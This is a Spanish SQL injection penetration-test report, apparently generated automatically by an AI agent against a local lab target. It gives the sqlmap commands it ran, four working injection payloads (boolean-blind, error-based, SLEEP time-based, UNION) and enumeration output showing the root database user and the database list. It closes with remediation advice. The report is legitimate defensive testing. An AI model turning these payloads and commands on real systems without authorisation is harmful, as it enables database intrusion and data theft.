# Informe de prueba de intrusión — SQL Injection (DAST)

Fecha: 2026-04-13T09:58:56
Objetivo: http://web.dev.local:8083

## Resumen ejecutivo
Se detectó una vulnerabilidad de inyección SQL (SQLi) en el parámetro GET "id" del formulario de búsqueda (método GET). Se consiguió explotar la vulnerabilidad para obtener el usuario de la base de datos (root@%) y la lista de bases de datos (incluyendo `sqli_demo`).

Vulnerabilidad encontrada: Sí
Explotación: Sí (enumeración de DBs y usuario)

## Vectores analizados
- Página raíz: GET http://web.dev.local:8083
- Formulario GET (action="#") con campo `id` (input name="id")
- No se encontraron enlaces con query strings adicionales en la página (links_with_qs vacío)

## Metodología y comandos ejecutados
1. Reconocimiento: se descargó la página raíz y se analizó: curl -sS -D headers.txt http://web.dev.local:8083
2. Identificación de vectores: extracción de formularios e inputs (campo `id`).
3. Escaneo con sqlmap para formularios:
   - sqlmap --batch --forms -u http://web.dev.local:8083
   (Salida guardada en /tmp/sqli_scan/sqlmap_forms.txt)
4. Explotación dirigida sobre parámetro confirmado `id`:
   - sqlmap --batch -u "http://web.dev.local:8083?id=1&Submit=Submit" -p id --dbs --current-user --threads=2
   (Salida guardada en /tmp/sqli_scan/sqlmap_exploit2.txt)

Todas las ejecuciones incluyeron la opción --batch (no interactivo) conforme a la pauta.

## Hallazgos (detalles técnicos)
- Punto vulnerable: parámetro GET `id` en el formulario.
- Técnicas detectadas por sqlmap:
  - boolean-based blind
  - error-based (EXTRACTVALUE)
  - time-based blind (SLEEP)
  - UNION query (2 columnas)

Payloads observados (extraídos de la salida de sqlmap):
- id=2352' OR NOT 7247=7247#&Submit=Submit
- id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit
- id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit
- id=2352' UNION ALL SELECT CONCAT(0x7176627171,0x72427059744f476b4d78544e587a484175417453704154766b554d6c5077574f6c754a7245786d58,0x7171767871),NULL#&Submit=Submit

Herramientas: sqlmap 1.10.2#stable

## Evidencia de explotación
Salida relevante de sqlmap (resumen):
- Current user: 'root@%'
- Available databases [5]: information_schema, mysql, performance_schema, sqli_demo, sys

Archivos con evidencia generados en el equipo de pruebas:
- /tmp/sqli_scan/sqlmap_forms.txt (detección y payloads)
- /tmp/sqli_scan/sqlmap_exploit2.txt (enumeración: usuario y DBs)
- csv/text results en: /root/.local/share/sqlmap/output/web.dev.local (sqlmap guarda resultados allí)

Fragmentos clave (copiados de la salida):
> Parameter: id (GET)
>     Type: boolean-based blind
>     ...
> [09:58:56] [INFO] fetching current user
> current user: 'root@%'
> [09:58:56] [INFO] fetching database names
> available databases [5]: information_schema, mysql, performance_schema, sqli_demo, sys

## Impacto
- Un atacante que controle el parámetro `id` podría extraer datos de la base de datos, incluidas tablas sensibles. Se demostró lectura de la información del usuario de la base de datos y listado de bases.
- Dependiendo de la aplicación y permisos, es posible exfiltrar tablas con credenciales o datos de usuarios y escalar impacto.

## Recomendaciones
1. Evitar concatenar entradas de usuario en consultas SQL. Usar consultas parametrizadas (prepared statements) en el backend.
2. Validar y sanitizar entradas: aplicar validación estricta del tipo y formato (p.ej. id numérico) en el servidor.
3. Revisar privilegios de la cuenta de la base de datos usada por la aplicación; no usar cuentas con privilegios excesivos (no usar root).
4. Habilitar registros y detección de intrusiones para peticiones anómalas (SQLi patterns, tiempos de respuesta SLEEP).
5. Revisar y eliminar funciones o páginas de prueba (sqli_demo) y aplicar parches/actualizaciones.

## Conclusión
Se confirmó y explotó (a nivel de enumeración) una vulnerabilidad SQLi en el parámetro GET `id`. Se extrajeron con éxito el usuario de la base de datos (root@%) y la lista de bases de datos (incluyendo `sqli_demo`). Se recomienda priorizar la mitigación inmediata.

---
Informe generado automáticamente y guardado en: /app/reports/informe_kali_context_gpt5mini_2026-04-13T09:58:56.md
